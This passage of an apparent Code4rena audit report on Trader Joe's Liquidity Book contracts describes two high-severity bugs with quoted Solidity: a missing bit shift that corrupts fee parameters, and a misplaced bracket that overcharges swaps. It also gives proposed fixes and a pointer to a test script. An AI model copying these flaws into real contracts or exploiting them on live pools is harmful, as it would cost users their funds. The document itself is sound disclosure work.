</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"929\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_varParameters</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"930\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        = </span><span class=\"mtk12\">_feeStorageSlot</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_OFFSET_VARIABLE_FEE_PARAMETERS</span><span class=\"mtk3\">/*=144*/</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"931\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"932\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// [#explain]  get 144 lowest bits of packedFeeParameters </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"933\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">///             and stores it in the 144 lowest bits of _newFeeParameters  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"934\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newFeeParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_packedFeeParameters</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint144</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"935\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"936\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"937\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// [$audit-high] wrong operation `or` here </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"938\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//              Mitigate: or(_newFeeParameters, _varParameters &lt;&lt; 144)    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"939\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">sstore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_feeParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slot</span><span class=\"mtk1\">, </span><span class=\"mtk11\">or</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newFeeParameters</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_varParameters</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"940\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"941\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As we can see in the implementation of <code>LBPair._setFeesParametes</code> above, it gets the 112 highest bits of <code>_feeStorageSlot</code> and stores it in the 112 lowest bits of <code>_varParameter</code>. Then it gets the 144 lowest bits of <code>packedFeeParameter</code> and stores it in the 144 lowest bits of <code>_newFeeParameters</code>.</p>\n<p>Following the purpose of function <code>setFeeParameters</code>, the new <code>LBPair._feeParameters</code> should form as follow:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// keep 112 highest bits remain unchanged </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// set 144 lowest bits to `_newFeeParameter`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[...112 bits...][....144 bits.....]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[_varParameters][_newFeeParameters]</span></span></code></pre>\n<p>It will make <code>feeParameters = _newFeeParameters | (_varParameters &#x3C;&#x3C; 144)</code>. But current implementation just stores the <code>or</code> value of <code>_varParameters</code> and <code>_newFeeParameter</code> into <code>_feeParameters.slot</code>. It forgot to shift left the <code>_varParameters</code> 144 bits before executing <code>or</code> operation.</p>\n<p>This will make the value of <code>binStep</code>, …, <code>maxVolatilityAccumulated</code> incorrect, and also remove the value (make the bit equal to 0) of <code>volatilityAccumulated</code>, …, <code>time</code>.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li>Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint)</li>\n<li>Break the functionality of LBPair. The user can’t swap/mint/flashLoan</li>\n</ul>\n<p>--> Make all the tokens stuck in the pools</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>Here is our test script to describe the impacts</p>\n<ul>\n<li><a href=\"https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769\">https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769</a></li>\n</ul>\n<p>You can place this file into <code>/test</code> folder and run it using</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-contract High1Test -vv</span></span></code></pre>\n<p>Explanation of test script:</p>\n<ol>\n<li>First we create a pair with <code>binStep = DEFAULT_BIN_STEP = 25</code></li>\n<li>We do some actions (add liquidity -> mint -> swap) to increase the value of <code>volatilityAccumulated</code> from <code>0</code> to <code>60000</code></li>\n<li>We call function <code>factory.setFeeParametersOnPair</code> to set new fee parameters.</li>\n<li>After that the value of <code>volatilityAccumulated</code> changed to value <code>0</code> (It should still be unchanged after <code>factory.setFeeParametersOnPair</code>)</li>\n<li>\n<p>We check the value of <code>binStep</code> and it changed from<code>25</code> to <code>60025</code></p>\n<ul>\n<li><code>binStep</code> has that value because <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915\">line 915</a> set <code>binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025</code>.</li>\n</ul>\n</li>\n<li>This change of <code>binStep</code> value will break all the functionality of <code>LBPair</code> cause <code>binStep > Constant.BASIS_POINT_MAX = 10000</code> <code>--></code> <code>Error: BinStepOverflows</code></li>\n</ol>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify function <code>LBPair._setFeesParaters</code> as follow:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"917\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"918\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setFeesParameters</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_packedFeeParameters</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"919\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeStorageSlot</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"920\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"921\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        _feeStorageSlot := </span><span class=\"mtk11\">sload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_feeParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slot</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"922\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"923\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"924\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"925\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_varParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_feeStorageSlot</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_OFFSET_VARIABLE_FEE_PARAMETERS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"926\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newFeeParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_packedFeeParameters</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint144</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"927\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"928\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"929\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"930\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">sstore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_feeParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slot</span><span class=\"mtk1\">, </span><span class=\"mtk11\">or</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newFeeParameters</span><span class=\"mtk1\">, </span><span class=\"mtk11\">shl</span><span class=\"mtk1\">(</span><span class=\"mtk7\">144</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_varParameters</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"931\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"932\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384#issuecomment-1310455200\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a missing shift, packed settings for <code>feeParameters</code> will be improperly stored, causing undefined behaviour.</p>\n<p>The mistake can be trivially fixed and the above code offers a test case for remediation.</p>\n<p>Because the finding impacts the protocol functionality, despite it’s perceived simplicity, I agree with High Severity as the code is not working as intended in a fundamental way.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-wrong-calculation-in-function-lbrouter_getamountsin-make-user-lose-a-lot-of-tokens-when-swap-through-joepair-most-of-them-will-gifted-to-joepair-freely\" style=\"position:relative;\"><a href=\"#h-04-wrong-calculation-in-function-lbrouter_getamountsin-make-user-lose-a-lot-of-tokens-when-swap-through-joepair-most-of-them-will-gifted-to-joepair-freely\" aria-label=\"h 04 wrong calculation in function lbrouter_getamountsin make user lose a lot of tokens when swap through joepair most of them will gifted to joepair freely permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400\">[H-04] Wrong calculation in function <code>LBRouter._getAmountsIn</code> make user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400\">KIntern_NA</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/442\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/341\">Jeiwan</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/88\">cccz</a></em></p>\n<p>Function <code>LBRouter._getAmountsIn</code> is a helper function to return the amounts in with given <code>amountOut</code>. This function will check the pair of <code>_token</code> and <code>_tokenNext</code> is <code>JoePair</code> or <code>LBPair</code> using <code>_binStep</code>.</p>\n<ul>\n<li>If <code>_binStep == 0</code>, it will be a <code>JoePair</code> otherwise it will be an <code>LBPair</code>.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_binStep</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">IJoePair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\">) = (</span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Legacy uniswap way of rounding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = (</span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">amountOut_</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1_000</span><span class=\"mtk1\">) / (</span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amountOut_</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">997</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">], ) = </span><span class=\"mtk11\">getSwapIn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ILBPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk11\">ILBPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenX</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As we can see when <code>_binStep == 0</code> and <code>_token &#x3C; _tokenPath[i]</code> (in another word  we swap through <code>JoePair</code> and pair’s<code>token0</code> is <code>_token</code> and <code>token1</code> is <code>_tokenPath[i]</code>), it will</p>\n<ol>\n<li>Get the reserve of pair (<code>reserveIn</code>, <code>reserveOut</code>)</li>\n<li>Calculate the <code>_amountIn</code> by using the formula</li>\n</ol>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1</span></span></code></pre>\n<p>But unfortunately the denominator <code>_reserveOut - amountOut_ * 997</code> seem incorrect. It should be <code>(_reserveOut - amountOut_) * 997</code>.<br>\nWe will do some math calculations here to prove the expression above is wrong.</p>\n<p><strong>Input:</strong></p>\n<ul>\n<li><code>_reserveIn (rIn)</code>: reserve of <code>_token</code> in pair</li>\n<li><code>_reserveOut (rOut)</code>: reserve of <code>_tokenPath[i]</code> in pair</li>\n<li><code>amountOut_</code>: the amount of <code>_tokenPath</code> the user wants to gain</li>\n</ul>\n<p><strong>Output:</strong></p>\n<ul>\n<li><code>rAmountIn</code>: the actual amount of <code>_token</code> we need to transfer to the pair.</li>\n</ul>\n<p><strong>Generate Formula:</strong></p>\n<p>Cause <code>JoePair</code> <a href=\"https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees\">takes 0.3%</a> of <code>amountIn</code> as fee, we get</p>\n<ul>\n<li><code>amountInDeductFee = amountIn' * 0.997</code></li>\n</ul>\n<p>Following the <a href=\"https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula\">constant product formula</a>, we have</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ==&gt; rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &lt;=&gt; amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &lt;=&gt; rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &lt;=&gt; rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &lt;=&gt; </span></span></code></pre>\n<p>As we can see <code>rAmountIn</code> is different from <code>amountsIn[i - 1]</code>, the denominator of <code>rAmountIn</code> is <code>(rOut - amountOut_) * 997</code> when the denominator of <code>amountsIn[i - 1]</code> is <code>_reserveOut - amountOut_ * 997</code> (Missing one bracket)</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p><strong>Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.</strong></p>\n<p>Let dive in the function <code>swapTokensForExactTokens()</code> to figure out why this scenario happens. I will assume I just swap through only one pool from <code>JoePair</code> and 0 pool from <code>LBPair</code>.</p>\n<ul>\n<li>\n<p>Firstly function will get the list <code>amountsIn</code> from function <code>_getAmountsIn</code>. So 